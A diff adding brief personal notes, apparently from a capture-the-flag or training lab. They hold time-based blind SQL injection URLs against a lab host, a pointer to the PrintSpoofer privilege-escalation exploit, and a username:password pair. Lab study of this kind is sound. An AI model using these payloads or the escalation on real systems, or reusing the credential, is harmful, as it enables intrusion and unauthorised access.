@@ -1,0 +1,12 @@
+packet tracer
+
+printspoofer64.exe -> exploit SeImpersonate privilege enabled
+
+sqli_four
+table - analytics_referrers, cols - domain, id
+
+https://website.thm/analytics?referrer=admin123' union select sleep(2), 2 from information_schema.columns  where table_schema='sqli_four' and table_name =  'analytics_referrers'  and column_name != 'domain' and column_name != 'id';--
+
+https://website.thm/analytics?referrer=admin123' union select sleep(2), 2 from analytics_referrers where id like '%';--
+
+m.rivera : letmein1
